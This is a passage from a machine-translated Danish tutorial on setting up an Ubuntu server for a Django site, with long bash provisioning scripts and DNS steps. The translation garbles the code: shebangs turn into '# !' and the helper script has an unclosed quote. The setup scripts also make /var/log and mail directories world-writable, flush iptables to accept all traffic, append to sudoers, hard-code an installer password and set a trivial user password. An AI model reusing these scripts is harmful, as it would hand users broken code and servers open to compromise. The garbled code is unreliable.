</code></pre>For at lede dig gennem denne fil, lad os starte linje for linje. Den første linje fortæller kompilatoren, at dette er et bash -script. Derefter installerer vi afhængigheder, kopierer sshd_config til det rigtige bibliotek, genstarter SSH, genererer ssh -nøgler til rod, tilføjer brugeren 'team' (du kan vælge et navn, du kan lide til dette, brug addUser -kommandoen med deres navn og deaktiveret adgangskode til adgangskode til nu). Vi tilføjer også team til sudo -gruppen, genererer deres SSH -nøgle, tilføjer også vores nøgle til autoriserede nøgler og deres og udskriver deres nøgle. Denne nye bruger vil være, hvordan vi logger ind på webstedet.

I en ny terminal skal du gå videre og åbne serveren igen.<pre class="language-bash"><code>
ssh team@XX.XX.XX.XX
</code></pre>Du skal ikke have brug for en adgangskode denne gang, da du har en SSH -nøgle. Vi har også deaktiveret login med adgangskode for at holde webstedet mere sikkert.

Nu starter denne server helt tomt uden oplysninger om den. Lad os starte med at klone vores projekt fra Git, så vi kan downloade og køre det på fjernmaskinen. På den eksterne server, der er tilsluttet over SSH, skal du først udskrive din SSH -nøgle:<pre class="language-bash"><code>
cat ~/.ssh/id_rsa.pub
</code></pre>Indsæt derefter denne nøgle i Git -indstillingerne, som vi gjorde før for at konfigurere vores Git Repository. Vi kan nu klone vores projekt direkte til serveren. Sørg for, at du har sikkerhedskopieret projektet lokalt først, så det er på Git -serveren at downloade.<pre class="language-bash"><code>
git clone git://github.com/you/yourproject.git
</code></pre>Perfektionere. Nu er alle filerne her. Vi kan se dem med LS<pre class="language-bash"><code>
ls
</code></pre>Lad os nu begynde at konfigurere serveren. Kopier først dit projektkatalog til et enkelt, mindeværdigt navn, vi vil bruge til projektet.<pre class="language-bash"><code>
cp -r yourproject whatyoucalledit
</code></pre>Hvor "Whatyoucalledit" er det nye navn på dit projekt. Dernæst bliver vi nødt til at opbygge et grundlæggende værktøj til at konfigurere serveren. Vi gemmer dette værktøj og bruger det i fremtiden. For at opbygge dette værktøj, lad os oprette en brugerbinær til at definere, hvordan vi redigerer et script. Brug af bash, rediger/usr/bin/ascript<pre class="language-bash"><code>
sudo nano /usr/bin/ascript
</code></pre>Sørg for at bruge Sudo der, så du har tilladelser til at redigere filen. Tilføj disse linjer i filen:<pre class="language-bash"><code>
# !
if [ ! -f /usr/bin/$1 ]; then
    sudo touch /usr/bin/$1
    echo "# !
    sudo chmod a+x /usr/bin/$1
    sudo nano /usr/bin/$1
    echo $1 | sudo tee -a /etc/ascripts
else
    sudo chmod a+x /usr/bin/$1
    sudo nano /usr/bin/$1
fi
</code></pre>Husk, at dette script tager et argument, scriptnavnet, som $ 1. Først kontrollerer den, om filen findes, eller på anden måde opretter den, tilføjer den første linje for at erklære scriptet er bash, ændrer dens tilladelser, redigerer den og tilføjer sit navn til /etc /ascripts, der lader os gemme navnene på manuskripterne vi skaber. Hvis filen allerede findes, skal du blot ændre tilladelser og redigere den. Gem filen, og derefter ændrer vi dens tilladelser. Så længe vi bruger dette script, behøver vi ikke gøre det igen.<pre class="language-bash"><code>
sudo chmod a+x /usr/bin/ascript
</code></pre>Perfektionere. Lad os nu oprette et script kaldet Setup. For det første ikke at overvælde dig, men se på, hvordan mit installations script ser ud. Vi går igennem, hvordan dette script skal se ud i dit projekt, du har ikke brug for alt i mit script til at starte med.<pre class="language-bash"><code>
# !
SECONDS=0
PYTHON_VERSION=3.12
echo "femmebabe installer initialized."
# sudo chmod A+X -scripts/brugersitup
# ./scripts/usersetup
# Ssh-keyen
# Projektkatalog
DIR="/home/team/femmebabe"
USER="team"
# Logkommandoer
echo "Logging commands"
sudo cp log/commands.log /var/log/commands.log
sudo chmod -R a+w /var/log
sudo chown -R :syslog /var/log
echo $'alias venv="source /home/team/femmebabe/venv/bin/activate"' | sudo tee -a /home/team/.profile
echo $'PROMPT_COMMAND=\'RETRN_VAL=$?;logger -p local6.debug "$(whoami) [$$]: $(history 1 | sed "s/^[ ]*[0-9]\+[ ]*//" )"\'' | sudo tee -a /etc/bashrc
echo $'PROMPT_COMMAND=\'RETRN_VAL=$?;logger -p local6.debug "$(whoami) [$$]: $(history 1 | sed "s/^[ ]*[0-9]\+[ ]*//" )"\'' | sudo tee -a "/home/team/.bashrc"
echo $'PROMPT_COMMAND=\'RETRN_VAL=$?;logger -p local6.debug "$(whoami) [$$]: $(history 1 | sed "s/^[ ]*[0-9]\+[ ]*//" )"\'' | sudo tee -a /root/.bashrc
echo "source /etc/bashrc" | sudo tee -a /home/team/.profile
echo "/var/log/commands.log" | sudo tee -a /etc/logrotate.d/syslog
echo "local6.*    /var/log/commands.log" | sudo tee -a "/etc/rsyslog.d/bash.conf"
sudo service rsyslog restart
# Nano Config
echo "set tabsize 4" &gt;&gt; .nanorc
echo "set tabstospaces" &gt;&gt; .nanorc
# Git config
echo "Git configuration"
sudo git config --global user.email "jasper.camber.holton@gmail.com" &amp;&amp; sudo git config --global user.name "Jasper Holton"
git config --global user.email "jasper.camber.holton@gmail.com"
git config --global user.name "Jasper Holton"
git config --global --add safe.directory $"$DIR"
sudo ssh-keyscan -t rsa gitlab.com | sudo tee -a /root/.ssh/known_hosts
sudo ssh-keyscan -t rsa github.com | sudo tee -a /root/.ssh/known_hosts
echo "Mounting setup"
sudo mount -o remount,size=16G,exec /tmp
# Opdatere og installere
echo "Update and install packages"
sudo apt update &amp;&amp; sudo NEEDRESTART_MODE=a apt upgrade -y
sudo apt purge postgresql-client-14 postgresql-client-common postgresql-common postgresql-contrib postgresql -y
echo "postfix postfix/mailname string femmebabe.com" | sudo debconf-set-selections
echo "postfix postfix/main_mailer_type string 'Internet Site'" | sudo debconf-set-selections
sudo NEEDRESTART_MODE=a DEBIAN_FRONTEND=noninteractive apt install -y postfix
sudo NEEDRESTART_MODE=a apt install -y rkhunter clamav-daemon libx264-dev ffmpeg libapache2-mod-wsgi-py3 apache2 cmake python-is-python3 python3-venv python3-pip python3-django expect tesseract-ocr openjdk-8-jdk redis-server libopencv-dev python3-opencv python3-dev libsasl2-dev opendkim opendkim-tools dovecot-core dovecot-pop3d dovecot-imapd auditd procmail libpq-dev postgresql postgresql-contrib libheif-dev snapd git software-properties-common certbot python3-certbot-apache
echo "-a exit,always -F arch=b64 -F euid=0 -S execve" | sudo tee -a /etc/audit/audit.rules
echo "-a exit,always -F arch=b32 -F euid=0 -S execve" | sudo tee -a /etc/audit/audit.rules
# Aktivér Clamav -antivirus
echo "Starting antivirus"
sudo systemctl enable clamav-daemon
sudo systemctl start clamav-daemon
# Indstil værtsnavn
echo "127.0.0.1 femmebabe" | sudo tee -a /etc/hosts
sudo hostnamectl set-hostname localhost
# Opsætning af postgres
echo "Postgres setup"
sudo -u postgres psql -U postgres -c "DROP DATABASE database;"
sudo -u postgres psql -U postgres -c "CREATE DATABASE database;"
sudo -u postgres psql -U postgres -c "CREATE USER django WITH PASSWORD 'password';"
sudo -u postgres psql -U postgres -c "ALTER ROLE django SET client_encoding TO 'utf8';"
sudo -u postgres psql -U postgres -c "ALTER ROLE django SET default_transaction_isolation TO 'read committed';"
sudo -u postgres psql -U postgres -c "ALTER ROLE django SET timezone TO 'UTC';"
sudo -u postgres psql -U postgres -c "GRANT ALL PRIVILEGES ON DATABASE database TO django;"
# Opsætning af backup -database
echo "Building database from backup, this may take a while."
cat db.json.?? &gt; db.json
echo "Configuring firewall"
sudo ufw default allow outgoing
sudo ufw default deny incoming
sudo ufw allow 22
sudo ufw allow http
sudo ufw allow https
sudo ufw allow 'Postfix'
sudo ufw allow 'Postfix SMTPS'
sudo ufw allow 'Postfix Submission'
sudo ufw allow 'Dovecot POP3'
sudo ufw allow 'Dovecot Secure POP3'
sudo ufw allow 110/tcp
sudo ufw allow 25/tcp
echo "y" | sudo ufw enable
# Handicappede ipatables
echo "Configuring firewall"
sudo iptables -P INPUT ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -F
sudo iptables-save
# Installer bitdefender
cd $DIR
echo "Runnning BitDefender antivirus installer"
wget https://cloud.gravityzone.bitdefender.com/Packages/NIX/0/7aTSsy/setup_downloader.tar
mkdir bitdefender
tar -xf setup_downloader.tar -C bitdefender
sudo rm setup_downloader.tar
sed -i -e 's/{LOGINPASSWD/z&amp;A*3BPd_qBGUMs/g' bitdefender/installer
sudo chmod a+x bitdefender/installer
sudo ./bitdefender/installer
# Opsætning Postfix
cd $DIR
echo "Mail services configuration"
sudo cp /etc/postfix/main.cf /etc/postfix/main.cf.backup
sudo cp config/etc_postfix_main.cf /etc/postfix/main.cf
sudo cp config/etc_postfix_master.cf /etc/postfix/master.cf
sudo cp config/etc_default_opendkim /etc/default/opendkim
sudo cp config/etc_dovecot_conf.d_10-auth.conf /etc/dovecot/conf.d/10-auth.conf
sudo cp config/etc_dovecot_conf.d_10-master.conf /etc/dovecot/conf.d/10-master.conf
sudo cp config/etc_dovecot_dovecot.conf /etc/dovecot/dovecot.conf
sudo cp config/etc_dovecot_passwd /etc/dovecot/passwd
sudo cp config/etc_opendkim.conf /etc/opendkim.conf
sudo cp config/etc_default_opendkim /etc/default/opendkim
sudo adduser postfix opendkim
sudo mkdir /etc/opendkim
sudo mkdir /etc/opendkim/keys
sudo mkdir /etc/opendkim/keys/femmebabe.com
sudo mkdir /var/spool/postfix/opendkim
sudo echo "*@femmebabe.com     sendonly._domainkey.femmebabe.com" | sudo tee -a /etc/opendkim/signing.table
sudo echo "sendonly._domainkey.femmebabe.com    femmebabe.com:sendonly:/etc/opendkim/keys/femmebabe.com/sendonly.private" | sudo tee -a /etc/opendkim/key.table
sudo echo "127.0.0.1" | sudo tee -a /etc/opendkim/trusted.hosts
sudo echo "localhost" | sudo tee -a /etc/opendkim/trusted.hosts
sudo echo "" | sudo tee -a /etc/opendkim/trusted.hosts
sudo echo "*.femmebabe.com" | sudo tee -a /etc/opendkim/trusted.hosts
sudo chown -R opendkim:opendkim /etc/opendkim
sudo opendkim-genkey -b 2048 -d femmebabe.com -D /etc/opendkim/keys/femmebabe.com -s sendonly -v
sudo chmod go-rw /etc/opendkim/keys
sudo chown opendkim:opendkim /etc/opendkim/keys/femmebabe.com/sendonly.private
sudo chown opendkim:postfix /var/spool/postfix/opendkim
cd $DIR
sudo cp mailbox/* /var/mail/
sudo chown :users /var/mail/*
sudo chmod -R a+rwx /var/mail/*
sudo systemctl restart opendkim postfix dovecot
# Opret Dirs
cd $DIR
mkdir media/audio
mkdir media/audio/fingerprints
mkdir media/security
mkdir media/secure
mkdir media/secure/media
mkdir media/secure/video
mkdir media/secure/profile
mkdir media/secure/face
mkdir media/images
mkdir media/live
mkdir media/live/files
mkdir media/live/stills
mkdir media/files
mkdir temp
mkdir temp/data
mkdir temp/gfpgan
mkdir mail/inbox
mkdir mailbox
# Opsætning Virtuealenv
cd $DIR
echo "Creating virtual environment"
python -m venv venv
source venv/bin/activate
# Få og opbyg afhængigheder
echo "Getting and building dependencies, this may take a whike"
cd $DIR
git clone https://github.com/sukhitashvili/violence-detection.git
cp config/vd-requirements.txt violence-detection/requirements.txt
cp config/vd-model.py violence-detection/model.py
cd violence-detection
pip3 install -r requirements.txt
cd $DIR
wget https://github.com/TencentARC/GFPGAN/releases/download/v1.3.0/GFPGANv1.3.pth -P experiments/pretrained_models
git clone https://github.com/TencentARC/GFPGAN.git
git clone https://github.com/davisking/dlib.git
cd dlib
mkdir build; cd build; cmake ..; cmake --build .
cd ..
source venv/bin/activate
python setup.py install
cd $DIR
source venv/bin/activate
cd $DIR/GFPGAN/
echo "Installing python dependencies"
pip install basicsr
pip install facexlib
pip install -r requirements.txt
python setup.py develop
pip install realesrgan
cd $DIR
sudo chown -R team:users gfpgan
echo "Installing ta-lib"
wget https://prdownloads.sourceforge.net/ta-lib/ta-lib-0.4.0-src.tar.gz
tar xvzf ta-lib-0.4.0-src.tar.gz
sudo rm ta-lib-*
cd ta-lib
sudo ./configure
sudo make
sudo make install
# Indstil firewall -regler
cd $DIR
# Installer pypi -afhængigheder
echo "Installing remaining python dependencies (this may take a while)"
sudo systemctl mask tmp.mount
cd $DIR
source venv/bin/activate
pip3 install -U "celery[redis]"
pip3 install -r requirements.txt --use-deprecated=legacy-resolver --use-pep517
pip3 install --upgrade opencv-python # == 4.5.4.60
pip3 install --upgrade opencv-contrib-python # == 4.5.4.60
# PIP Installer OpenCV-Python == 4.5.5.64
# PIP Installer OpenCV-Contrib-Python == 4.5.5.64
pip3 install --upgrade opencv-python-headless
pip3 uninstall channels
pip3 uninstall daphne
pip3 install channels["daphne"]
pip3 install Pillow==9.5.0
pip3 install librosa
pip3 install -U 'Twisted[tls,http2]'
pip3 install --upgrade certifi requests urllib3 numpy oauthlib twisted pyjwt sqlparse cryptography astral webauthn docbarcodes pdf417 deepface --no-cache-dir
pip3 install tensorflow==2.15.1
# Installer certbot
echo "Installing certificates"
sudo snap install core; sudo snap refresh core
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
sudo snap install redis
sudo systemctl enable apache2
sudo systemctl start apache2
# Kør certbot
sudo certbot --apache --non-interactive --agree-tos --domains femmebabe.com --email jasper.camber.holton@gmail.com
# Genindlæs mailserver
sudo systemctl restart opendkim postfix dovecot
# Kopier certs
# sudo cp /etc/letsencrypt/live/femmebabe.com/privkey.pem Privkey.pem
# sudo cp /etc/lettesencrypt/live/femmebabe.com/cert.pem cert.pem
# Lappe
cp scripts/content.py $"/home/team/femmebabe/venv/lib/python${PYTHON_VERSION}/site-packages/pyxb/binding/content.py"
cp scripts/pwa_webpush_forms.py $"/home/team/femmebabe/venv/lib/python${PYTHON_VERSION}/site-packages/pwa_webpush/forms.py"
cp scripts/webauth_views.py $"/home/team/femmebabe/venv/lib/python${PYTHON_VERSION}/site-packages/webauth/views.py"
cp scripts/json.py $"venv/lib/python${PYTHON_VERSION}/site-packages/django/core/serializers/json.py"
# Indstil brugerindstillinger
sudo gpasswd -a www-data users
# Indstil tilladelser
echo "Setting permissions"
sudo chown -R team:users cache/
sudo chmod a+rwx -R cache/
# sudo chown -r team: brugere/var/run/
# sudo chown rod: rod/run/sudo/ts -r
sudo chown -R redis:redis /var/lib/redis
sudo chown -R redis:redis /var/log/redis
sudo chmod -R u+rwX,g+rwX,u+rx /var/log/redis
sudo chmod +r /etc/redis/redis.conf
sudo chown -R team:users /var/log/
sudo chown -R :users .././
sudo chmod -R g+rwX ./
sudo chmod -R g+rX .././
sudo chmod -R g-rwX ../.ssh
sudo chmod 774 ./
# sudo chmod 664 db.sqlite3
# sudo chown www-data: brugere db.sqlite3
sudo chown -R www-data:www-data media/
sudo chown www-data:users ./
sudo chown -R team:users media/
sudo chown -R team:users ./
sudo chown -R team:users ./gfpgan/
sudo chown -R team:users ./temp/
sudo chmod a+r team /var/mail/$USER
# Kopier konfiguration og indstil tilladelser
echo "Configuring remaining services"
sudo cp config/apis.json /etc/apis.json
sudo cp config/config.json /etc/config.json
sudo cp config/femmebabe-le-ssl.conf /etc/apache2/sites-available/femmebabe-le-ssl.conf
sudo cp config/etc_dovecot_passwd /etc/dovecot/passwd
sudo cp config/etc_init.d_celery /etc/init.d/celery
sudo cp config/etc_init.d_celerybeat /etc/init.d/celerybeat
sudo cp config/etc_default_celerybeat /etc/default/celerybeat
sudo cp config/etc_default_celery /etc/default/celery
sudo cp config/etc_systemd_system_daphne.service /etc/systemd/system/daphne.service
sudo cp config/etc_systemd_system_celery.service /etc/systemd/system/celery.service
sudo cp config/etc_systemd_system_celerybeat.service /etc/systemd/system/celerybeat.service
sudo chmod a+x /etc/init.d/celery
sudo chmod a+x /etc/init.d/celerybeat
# Databaseopsætning
echo "Running migrations, this should be quick"
python manage.py makemigrations
python manage.py migrate --run-syncdb
echo "Loading data, this may take a while"
python manage.py loaddata db.json
echo "Setup crontab/sudoers configuration"
sudo crontab -l -u root | cat - config/crontab | sudo crontab -u root -
sudo sh -c "cat config/sudoers &gt;&gt; /etc/sudoers"
# Injicer Pam Config og fjern defekt SSH -konfiguration
# Sudo sed -i '' -og $ d '/etc/pam.d/ssshd
# Sudo sed -i '' -og $ d ' /etc /profil
echo "session required pam_exec.so seteuid /home/team/femmebabe/pam.sh" | sudo tee -a /etc/pam.d/sshd
echo "session required pam_exec.so seteuid /home/team/femmebabe/logout.sh" | sudo tee -a /etc/pam.d/sshd
sudo chmod a+x pam.sh
sudo rm /etc/ssh/sshd_config.d/50-cloud-init.conf
# Kopier bin -scripts og indstil tilladelser
echo "Copying scripts"
sudo cp scripts/reload /usr/bin/
sudo cp scripts/check /usr/bin/
sudo cp scripts/enagpu /usr/bin/
sudo cp scripts/disgpu /usr/bin/
sudo cp scripts/activate /usr/bin/
sudo cp scripts/backup /usr/bin/
sudo cp scripts/ascript /usr/bin/
sudo cp scripts/setup /usr/bin/
sudo cp scripts/addsetup /usr/bin/
sudo cp scripts/watchlogs /usr/bin/
sudo cp scripts/logs /usr/bin/
sudo cp scripts/cmds /usr/bin/
sudo cp scripts/setup /usr/bin/
sudo cp scripts/pushweb /usr/bin/
sudo cp scripts/purgecache /usr/bin/
sudo cp config/banner /etc/banner
cd /usr/bin/
sudo chmod a+x activate
sudo chmod a+x backup
sudo chmod a+x ascript
# Genindlæs og aktiver tjenester
echo "Enabling services"
sudo systemctl daemon-reload
sudo systemctl enable daphne.service
sudo systemctl enable celery.service
sudo systemctl enable celerybeat.service
sudo systemctl enable clamav-daemon
sudo systemctl start daphne.service
sudo systemctl start celery.service
sudo systemctl start celerybeat.service
sudo systemctl start clamav-daemon
# Aktivér Apache -moduler
echo "Enabling apache2"
sudo a2enmod rewrite
sudo a2enmod wsgi
sudo a2enmod headers
sudo a2enmod ssl
sudo a2enmod proxy
sudo a2enmod proxy_balancer
sudo a2enmod proxy_http
sudo a2enmod proxy_wstunnel
# sudo a2dismod mpm_event
# sudo a2dismod mpm_worker
# sudo a2enmod mpm_prefork
# Deaktiver standardstedet
sudo a2dissite 000-default
sudo a2dissite 000-default-le-ssl
# Aktivér til webstedet
sudo a2ensite femmebabe-le-ssl
# Genindlæs dæmon og genstart Apache, Postfix og Opendkim
sudo systemctl daemon-reload
sudo systemctl restart apache2
sudo systemctl restart opendkim postfix
sudo systemctl start daphne
# Indstil tilladelser
sudo chown -R :www-data /var/www/
sudo chown -R :www-data /var/www/.deepface
# Swap -konfiguration
echo "Allocating swap, this may take a while"
sudo swapoff /swapfile
sudo rm /swapfile
sudo fallocate -l 8G /swapfile
sudo dd if=/dev/zero of=/swapfile bs=1024 count=8388608
sudo chmod 600 /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile
echo "/swapfile swap swap defaults 0 0" | sudo tee -a /etc/fstab
sudo swapon --show
# Init billedtekstmotor
echo "Initializing routine caption"
/home/team/femmebabe/venv/bin/python /home/team/femmebabe/routine_caption.py
/home/team/femmebabe/venv/bin/python /home/team/femmebabe/setup_mail.py
# Opsætning af git
echo "Setting up git"
cd $DIR
sudo rm -r .git
git init --initial-branch=main
echo "Setting user password"
sudo usermod --password $(echo team | openssl passwd -1 -stdin) team
# Vis IPv6 og Opendkim til domænekonfiguration
echo "COPY the below information to domain configuration."
hostname -I
ip a | grep inet
ip -6 addr | grep "scope link"
sudo cat /etc/opendkim/keys/femmebabe.com/sendonly.txt | tr -d '\n' | sed 's/\s//g' | sed 's/""//g' | awk -F'[)(]' '{print $2}'
# Opsætningen afsluttet
echo "Setup completed in"
wc -l scripts/setup
echo "lines of code."
echo "Total time:"
duration=$SECONDS
echo "$((duration / 60)) minutes and $((duration % 60)) seconds elapsed."
echo "TODO:"
echo "- COPY above IPv6 address to domain DNS configuration"
echo "- COPY domain key to domain DNS configuration"
echo "- ADD new git repository with git remote add originlab &lt;repo&gt;."
echo "- OPEN port 25"
echo "- INSTALL antivirus as per reccomendations"
echo "- TEST"
echo "If neccesary,"
echo "- DEBUG"
echo "- FIX setup and backup scripts"
echo "- Fix server"
echo ""
echo "Thank you for using the femmebabe installer. Have a great day!"
echo "Goodbye."
</code></pre>Det er en masse opsætning! Kort sagt, denne kode logger kommandoer, konfigurerer nano og git, kopier over filer, downloads og installerer Ubuntu APT -pakker, Python -afhængigheder, konfigurerer postfix, konfigurerer PostgreSQL (databaseserveren) og indlæser databasen, konfigurerer UFW (en ukompliceret firewall), Deaktiverer iptables, downloader en antivirus, laver mapper, kloner Afhængigheder, installerer certifikater og indstiller serveren, installerer konfiguration, starter og aktiverer Sever, tildeler swap, indstiller tilladelser og udskriver IPv6 -adressen og Opendkim -nøglen. Temmelig enkel, men det ligner en masse kode. Vi har ikke brug for meget af dette, fordi vi ikke har afhængighederne, vi bruger ikke selleri, selleri eller Daphne, men vi installerer nogle af dem alligevel for at komme i gang. Bemærk, at denne kode har et domæne erklæret flere gange.

Vi bliver også nødt til at købe et domænenavn (som er et lille årligt gebyr). Jeg anbefaler Squarespace til at købe et domæne, deres layout erintuitiv og let at bruge. Du kan købe ethvert domæne efter eget valg, men jeg bruger domænet femmebabe.com i dette eksempel. Når du har købt et domæne, skal du gå til Squarespace DNS -konfigurationspanelet og tilføje et A -rekord, der peger dit domæne til serveren med IP -adresse. Det skal se sådan ud:

@ A xx.xx.xx.xx

Med @ operatøren som vært, hvilket betyder, at alle underdomæner under dette domæne og roddomænet alle omdirigerer til serveren. Der er flere poster at erklære, men vi kan gå videre til disse, når vi er klar til at sende mail. Husk, at det kan tage flere dage, før du er i stand til at sende mail fra serveren. De DNS -poster, vi indstiller, tager tid at forplantes.

Alligevel er den eneste post, vi har brug for at starte, en A -rekord. Så nu kan vi udfylde nedenstående script i henhold til vores projekt og køre det.

Lad os starte med et mindre installationsskript for bare at installere det, vi har brug for for en grundlæggende fremgang. Vi bruger ikke så mange afhængigheder eller postgresql endnu, vi vil bareOp en grundlæggende HTTP -server og bekymre dig om at certificere den, når det er gjort. Husk, at for at få et HTTPS -certifikat og køre serveren sikkert, bliver vi nødt til at købe et domæne sammen med leje en server. Udskift nu "Team" i denne fil med navnet på din bruger, "Dir" med biblioteket til dit projekt, og levering din e -mail og domæne i &lt;&gt; tags.

Inden vi kører denne kode, er vi nødt til at ændre indstillingerne til den firewall, som hostingudbyderen understøtter, hvis nogen. Normalt er dette i fanen 'Netværk' af din hostingudbyder, eller hvis du er selvhosting, er det i afsnittet 'Port Videresending' af din router. Du vil også oprette en statisk IP gennem din router med adressen på din servermaskine, hvis du bruger selvhosting. Du bliver nødt til at åbne følgende porte for at læse/skriveadgang.

22 (SSH)
25 (mail)
587 (mail)
110 (mailklient)
80 (http)
443<pre class="language-bash"><code>
# !/bin/bash
SECONDS=0
PYTHON_VERSION=3.12
echo "femmebabe installer initialized."
DIR="/home/team/&lt;yourproject&gt;"
USER="team"
# Logkommandoer
echo "Logging commands"
sudo cp log/commands.log /var/log/commands.log
sudo chmod -R a+w /var/log
sudo chown -R :syslog /var/log
echo $'alias venv="source /home/team/femmebabe/venv/bin/activate"' | sudo tee -a /home/team/.profile
echo $'PROMPT_COMMAND=\'RETRN_VAL=$?;logger -p local6.debug "$(whoami) [$$]: $(history 1 | sed "s/^[ ]*[0-9]\+[ ]*//" )"\'' | sudo tee -a /etc/bashrc
echo $'PROMPT_COMMAND=\'RETRN_VAL=$?;logger -p local6.debug "$(whoami) [$$]: $(history 1 | sed "s/^[ ]*[0-9]\+[ ]*//" )"\'' | sudo tee -a "/home/team/.bashrc"
echo $'PROMPT_COMMAND=\'RETRN_VAL=$?;logger -p local6.debug "$(whoami) [$$]: $(history 1 | sed "s/^[ ]*[0-9]\+[ ]*//" )"\'' | sudo tee -a /root/.bashrc
echo "source /etc/bashrc" | sudo tee -a /home/team/.profile
echo "/var/log/commands.log" | sudo tee -a /etc/logrotate.d/syslog
echo "local6.*    /var/log/commands.log" | sudo tee -a "/etc/rsyslog.d/bash.conf"
sudo service rsyslog restart
# Nano Config
echo "set tabsize 4" &gt;&gt; .nanorc
echo "set tabstospaces" &gt;&gt; .nanorc
# Git config
echo "Git configuration"
sudo git config --global user.email "&lt;youremail&gt;@gmail.com" &amp;&amp; sudo git config --global user.name "&lt;yourname&gt;"
git config --global --add safe.directory $"$DIR"
sudo ssh-keyscan -t rsa gitlab.com | sudo tee -a /root/.ssh/known_hosts
sudo ssh-keyscan -t rsa github.com | sudo tee -a /root/.ssh/known_hosts
# Opdatere og installere
echo "Update and install packages"
sudo apt update &amp;&amp; sudo NEEDRESTART_MODE=a apt upgrade -y
sudo apt purge postgresql-client-14 postgresql-client-common postgresql-common postgresql-contrib postgresql -y
echo "postfix postfix/mailname string femmebabe.com" | sudo debconf-set-selections
echo "postfix postfix/main_mailer_type string 'Internet Site'" | sudo debconf-set-selections
sudo NEEDRESTART_MODE=a DEBIAN_FRONTEND=noninteractive apt install -y postfix
sudo NEEDRESTART_MODE=a apt install -y rkhunter clamav-daemon libx264-dev ffmpeg libapache2-mod-wsgi-py3 apache2 cmake python-is-python3 python3-venv python3-pip python3-django expect tesseract-ocr openjdk-8-jdk redis-server libopencv-dev python3-opencv python3-dev libsasl2-dev opendkim opendkim-tools dovecot-core dovecot-pop3d dovecot-imapd auditd procmail libpq-dev postgresql postgresql-contrib libheif-dev snapd git software-properties-common certbot python3-certbot-apache
# Aktivér Clamav -antivirus
echo "Starting antivirus"
sudo systemctl enable clamav-daemon
sudo systemctl start clamav-daemon
# Indstil værtsnavn
echo "127.0.0.1 femmebabe" | sudo tee -a /etc/hosts
sudo hostnamectl set-hostname femmebabe
# Opsætning af backup -database
echo "Building database from backup, this may take a while."
cat db.json.?? &gt; db.json
echo "Configuring firewall"
sudo ufw default allow outgoing
sudo ufw default deny incoming
sudo ufw allow 22
sudo ufw allow http
sudo ufw allow https
sudo ufw allow 'Postfix'
sudo ufw allow 'Postfix SMTPS'
sudo ufw allow 'Postfix Submission'
sudo ufw allow 'Dovecot POP3'
sudo ufw allow 'Dovecot Secure POP3'
sudo ufw allow 110/tcp
sudo ufw allow 25/tcp
echo "y" | sudo ufw enable
# Handicappede ipatables
echo "Configuring firewall"
sudo iptables -P INPUT ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -F
sudo iptables-save
# Opsætning Virtuealenv
cd $DIR
echo "Creating virtual environment"
python -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
# Installer certbot
echo "Installing certificates"
sudo snap install core; sudo snap refresh core
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
sudo snap install redis
sudo systemctl enable apache2
sudo systemctl start apache2
# Kør certbot
sudo certbot --apache --non-interactive --agree-tos --domains femmebabe.com --email &lt;youremail&gt;@gmail.com
# Indstil brugerindstillinger
sudo gpasswd -a www-data users
# Indstil tilladelser
echo "Setting permissions"
sudo chown -R team:users cache/
sudo chmod a+rwx -R cache/
# sudo chown -r team: brugere/var/run/
# sudo chown rod: rod/run/sudo/ts -r
sudo chown -R redis:redis /var/lib/redis
sudo chown -R redis:redis /var/log/redis
sudo chmod -R u+rwX,g+rwX,u+rx /var/log/redis
sudo chmod +r /etc/redis/redis.conf
sudo chown -R team:users /var/log/
sudo chown -R :users .././
sudo chmod -R g+rwX ./
sudo chmod -R g+rX .././
sudo chmod -R g-rwX ../.ssh
sudo chmod 774 ./
sudo chown -R www-data:www-data media/
sudo chown www-data:users ./
sudo chown -R team:users media/
sudo chown -R team:users ./
# Genindlæs og aktiver tjenester
echo "Enabling services"
sudo systemctl daemon-reload
sudo systemctl enable clamav-daemon
sudo systemctl start clamav-daemon
# Aktivér Apache -moduler
echo "Enabling apache2"
sudo a2enmod rewrite
sudo a2enmod wsgi
sudo a2enmod headers
sudo a2enmod ssl
sudo a2enmod proxy
sudo a2enmod proxy_balancer
sudo a2enmod proxy_http
sudo a2enmod proxy_wstunnel
# Genindlæs dæmon og genstart Apache, Postfix og Opendkim
sudo systemctl daemon-reload
sudo systemctl restart apache2
sudo systemctl restart opendkim postfix
# Vis IPv6 og Opendkim til domænekonfiguration
echo "COPY the below information to domain configuration."
hostname -I
ip a | grep inet
ip -6 addr | grep "scope link"
</code></pre>Før du kører denne kode, skal du sørge for, at det domæne, du har købt, er tilsluttet serveren. For at gøre dette skal du åbne en terminal på din lokale maskine og køre denne kommando med dit domæne:<pre class="language-bash"><code>
ping femmebabe.com # Indsæt dit domæne her, efter ping
</code></pre>Hvis alt ser godt ud, og serveren sender svar, er vi klar til at køre scriptet og installere pakker samt starte, aktivere og certificere vores Apache -server.

Dette er ikke al den opsætning, der er nødvendig for at konfigurere Postfix, vi vil se på den opsætning mere senere. For nu skal du køre denne installationskode, og det skal tage et par minutter at installere og certificere din server. Sørg igen for at udskifte navn, e -mail og domænenavn i scriptet i henhold til det navn, du har købt.

Nu hvor serveren er leveret, kan du gå til URL'en i enhver webbrowser og kontrollere for at sikre dig, at serveren kører HTTPS. Hvis det ikke er det, kan du prøve at vente et stykke tid på, at DNS -posterne skal indhente og derefter køre følgende kommando for at prøve certbot -certificering:<pre class="language-bash"><code>
sudo certbot --apache --non-interactive --agree-tos --domains &lt;domain&gt;.com --email &lt;youremail&gt;@gmail.com
</code></pre>Så længe du har konfigureret alt korrekt, skal du være i stand til at få adgang til Apache's standardside bare for at vide, at din kode fungerer og viser en live webside. Lad os derefter redigere indstillingerne.PY for at ændre vores standardfejletilstand til produktion. Vi konfigurerer også domænet i indstillingerne såvel som interne IP'er.<pre class="language-bash"><code>
nano yourproject/settings.py
</code></pre>I indstillingerne skal du ændre/tilføje disse linjer.<pre class="language-python"><code>
DEBUG = False

# Webstedskonfiguration
SITE_NAME = 'Femme Babe'
PROTOCOL = 'https'
DOMAIN = 'femmebabe.com'
SITE_ID = 1
BASE_URL = PROTOCOL + '://' + DOMAIN
ALLOWED_HOSTS = [DOMAIN]

INTERNAL_IPS = [
    'XX.XX.XX.XX',
]
